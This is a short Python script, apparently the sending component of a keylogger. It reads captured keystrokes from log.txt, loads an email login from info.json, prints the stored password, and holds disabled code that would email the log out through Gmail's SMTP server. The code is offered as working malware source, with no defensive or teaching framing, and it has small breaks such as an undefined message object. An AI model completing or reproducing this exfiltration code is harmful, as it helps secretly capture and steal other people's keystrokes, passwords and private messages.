# import smtplib
# from email.mime.text import MIMEText
import json

# Define your email parameters
sender = ""
password = ""
recipient = ""
subject = "Keylogger"
message = ""

# Get the contents of log.txt
with open("log.txt", "r") as txtFile:
    message = txtFile.read()

with open("info.json", "r") as jsonFile:
    data = json.load(jsonFile)
    sender = data["sender/recipient"]
    password = data["password"]
    recipient = sender

print(sender)
print(password)
print(recipient)
print(message)

"""
# Set the sender, recipient, and subject of the email
msg['From'] = sender
msg['To'] = recipient
msg['Subject'] = subject

# Connect to the SMTP server
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()

# Log in to your email account
server.login(sender, password)

# Send the email
server.sendmail(sender, recipient, msg.as_string())

# Close the SMTP server connection
server.quit()
"""
